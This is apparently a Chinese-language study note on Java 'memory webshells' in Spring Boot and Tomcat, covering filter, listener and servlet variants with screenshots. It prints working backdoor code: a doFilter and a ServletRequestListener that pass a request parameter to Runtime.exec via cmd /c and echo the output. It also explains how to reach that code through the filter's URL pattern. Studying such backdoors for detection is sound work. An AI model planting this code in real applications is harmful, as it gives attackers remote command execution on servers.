<a name="QjZmq"></a>
# 内存马快速识别
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639409886229-e8f80917-2c48-4c41-bbb1-ca08449e5760.png#clientId=ubc3ad6b4-1b05-4&from=paste&height=359&id=u92944704&originHeight=717&originWidth=1271&originalType=binary&ratio=1&size=86501&status=done&style=none&taskId=u6366df9d-a95f-4bbc-bfb5-0241301b4a1&width=635.5)

<a name="i4nOk"></a>
# 内存马浅析

<a name="zWknY"></a>
## filter内存马
首先写个简单的springboot路由(随便写那种，能访问就行)，然后创建Filter过滤器。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640229229790-d7317501-ad28-4fa7-b3d2-6bbdf428a736.png#clientId=uc54510b2-b7e2-4&from=paste&height=455&id=u795d3da4&originHeight=909&originWidth=1000&originalType=binary&ratio=1&size=136088&status=done&style=none&taskId=u9214c37a-66fb-4d90-a5e4-9f134a4f872&width=500)<br />生成的filter代码是这样子的<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640229244709-0a987ed3-753d-4c80-89bc-649e8d038ab5.png#clientId=uc54510b2-b7e2-4&from=paste&height=260&id=u8f3eb04a&originHeight=520&originWidth=1221&originalType=binary&ratio=1&size=49056&status=done&style=none&taskId=ud9290ef0-7493-4991-84cb-132a251916a&width=610.5)

然后再controller层添加bean<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640229279945-1f6ed938-48c2-4878-9684-8cd38c5b03a3.png#clientId=uc54510b2-b7e2-4&from=paste&height=308&id=u2e0fd44d&originHeight=616&originWidth=1368&originalType=binary&ratio=1&size=80423&status=done&style=none&taskId=u89ef6b52-8e79-4acc-8964-569ef582c9a&width=684)
```java
    @Bean
    public FilterRegistrationBean testFilterRegistration() {

        FilterRegistrationBean registration = new FilterRegistrationBean();
        registration.setFilter(new Filter());
        registration.addUrlPatterns("/*"); //表示会拦截任意路径
        registration.addInitParameter("paramName", "paramValue");
        registration.setName("testFilter");
        registration.setOrder(1);
        return registration;
    }
```
访问路径的时候，明显能看到filter的输出，可以看到filter的过程是init()→doFilter()→destroy()<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640229444218-509c6b71-556e-4e77-8793-eb2a9708a4fa.png#clientId=uc54510b2-b7e2-4&from=paste&height=184&id=u4d23a325&originHeight=367&originWidth=1457&originalType=binary&ratio=1&size=72546&status=done&style=none&taskId=u5241edf9-5423-4e4c-a99c-92a643f185e&width=728.5)<br />然而，filter内存马就是在执行过滤过程的时候，被植入了命令执行
```java
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
        System.out.println("filter 执行过滤过程");

        HttpServletRequest request = (HttpServletRequest) req;
        if (request.getParameter("c") != null){
            String[]  command = new String[]{"cmd", "/c", request.getParameter("c")};
            InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
            return;
        }
        chain.doFilter(req, resp);
    }
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640240162310-69f9f450-fc08-46c6-962e-0fd53d24edb0.png#clientId=u66f8da84-3a71-4&from=paste&height=383&id=u097bcdf5&originHeight=766&originWidth=1210&originalType=binary&ratio=1&size=80955&status=done&style=none&taskId=u293ea4cf-72c0-4012-b45a-50645cd0767&width=605)<br />那么，访问对应filter的路径加上参数就可以命令执行了<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640240220957-58670301-14d4-4b77-a583-feb43164dc03.png#clientId=u66f8da84-3a71-4&from=paste&height=489&id=u5a44b3c8&originHeight=771&originWidth=695&originalType=binary&ratio=1&size=41380&status=done&style=none&taskId=u815c053d-bc3b-411c-b91f-5bb7d0d4625&width=440.5)<br />至于webshell访问的路径，需要看filter拦截器拦截的路由是什么，如果是/*就是任意路由加参数就能命令执行，如果是/abc，就得访问abc加参数才能命令执行<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640251889002-d25ab1ed-1800-4009-874d-fc0f7efc4e79.png#clientId=u1ac0efdc-39d1-4&from=paste&height=345&id=u83383775&originHeight=690&originWidth=1233&originalType=binary&ratio=1&size=76037&status=done&style=none&taskId=ub88c1c3a-f6d0-4181-859f-e858753f3cf&width=616.5)

<a name="cvHu0"></a>
## listener内存马
Listener的种类有很多，但是有些不适用于作为内存马，比如ServletContextListener需要涉及到启动和停止服务器(springboot在idea中自建的Listener)，HttpSessionListener需要设计session的创建和销毁，而ServletRequestListener只涉及到当前请求，所以最适合做内存马的是ServletRequestListener

listener主要以下两个函数<br />requestInitialized()<br />requestDestroyed()

直接在这两个函数中插入命令执行的java<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640276236474-40c85001-a704-4250-8fed-3e95de6bec8f.png#clientId=u1ac0efdc-39d1-4&from=paste&height=399&id=u5aa9f2d0&originHeight=797&originWidth=1616&originalType=binary&ratio=1&size=125759&status=done&style=none&taskId=ucaf2597b-ad8f-4ae9-b0bf-fc661520be8&width=808)

crontroller层中需要<br />@ServletComponentScan(basePackages = **"com.test5.demo"**) 来指定listener的包名<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640276292430-e4e57007-79ee-44c8-8b43-0910fef44e30.png#clientId=u1ac0efdc-39d1-4&from=paste&height=552&id=u917b96d8&originHeight=817&originWidth=732&originalType=binary&ratio=1&size=77508&status=done&style=none&taskId=u391be3c2-75df-4a19-9604-7392457bd34&width=495)<br />启动之后，只有访问才能监听到listener的请求<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640276393346-e9268213-cc08-4bc3-a708-45926dd10c58.png#clientId=u1ac0efdc-39d1-4&from=paste&height=511&id=ufb6685dd&originHeight=1022&originWidth=1920&originalType=binary&ratio=1&size=242478&status=done&style=none&taskId=u545f5ae1-d948-43f6-890e-8e81c324c48&width=960)<br />虽然页面报错，但是命令在调试的时候，发现是执行了的<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640276414371-63441984-e134-4ce8-9f22-6df5bf68cc86.png#clientId=u1ac0efdc-39d1-4&from=paste&height=299&id=ue35bde6b&originHeight=598&originWidth=1213&originalType=binary&ratio=1&size=121976&status=done&style=none&taskId=ue105497e-7723-4d68-93d3-e8eafab852f&width=606.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640276446709-2ff096a1-421d-4d7e-92ad-ba9df4c4c73f.png#clientId=u1ac0efdc-39d1-4&from=paste&height=155&id=u6e7171ff&originHeight=376&originWidth=1744&originalType=binary&ratio=1&size=88359&status=done&style=none&taskId=u7d695390-c560-4d07-b0bf-0be48270fbd&width=717.4000244140625)

调试发现是输出的报错问题，于是换一个输出的方式，listener型内存马的listener如下所示
```java
package com.test5.demo;

import org.apache.catalina.connector.Request;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebListener()
public class Listener implements ServletRequestListener {
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("listener destroy");
    }
    public void requestInitialized(ServletRequestEvent sre){
        System.out.println("listener init");
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        if (req.getParameter("cmd") != null){
            InputStream in = null;
            try {
                in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request)requestF.get(req);
                PrintWriter out= request.getResponse().getWriter();
                out.println(output);
                out.flush();
                out.close();
            }
            catch (IOException e) {}
            catch (NoSuchFieldException e) {}
            catch (IllegalAccessException e) {}
        }
    }

}

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640277103427-7705de27-e967-4faf-8d8b-f66eb312cfbd.png#clientId=u9f5be1ec-f29a-4&from=paste&height=402&id=u324c58ac&originHeight=427&originWidth=751&originalType=binary&ratio=1&size=34800&status=done&style=none&taskId=u8d156877-149e-4545-b699-a8c91e07e30&width=707.5)

<a name="IG0KS"></a>
## servlet内存马
内存马的顺序是由 listen→filter→servlet的顺序<br />用springboot创建servlet内存马，创建后会有doGet、dopost方法，都是可以用来执行函数的<br />如下图所示，servlet的路径为/myservlet<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640411434119-5549bf61-71de-4a5d-9ed6-07235456f3ca.png#clientId=u72a287ae-9e7c-4&from=paste&height=313&id=u53f2d698&originHeight=625&originWidth=1673&originalType=binary&ratio=1&size=100624&status=done&style=none&taskId=ub24349c2-0cfa-46a8-bf03-5214bcba7c7&width=836.5)<br />同样的controller层下绑定ServletComponentScan<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640411479590-15404664-5518-4506-9c0e-83d31998c5ee.png#clientId=u72a287ae-9e7c-4&from=paste&height=303&id=u373a516b&originHeight=606&originWidth=1221&originalType=binary&ratio=1&size=78735&status=done&style=none&taskId=ue2ba8bf3-a46a-4833-958c-977493aa259&width=610.5)

访问/myservlet路径，就可以回显内存马了<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640411570180-86be04f3-dc2e-40e6-9431-7423b8f029c3.png#clientId=u72a287ae-9e7c-4&from=paste&height=385&id=u64494df3&originHeight=770&originWidth=1507&originalType=binary&ratio=1&size=143212&status=done&style=none&taskId=u0dd56ca8-8f62-485d-9f45-725865dad7a&width=753.5)
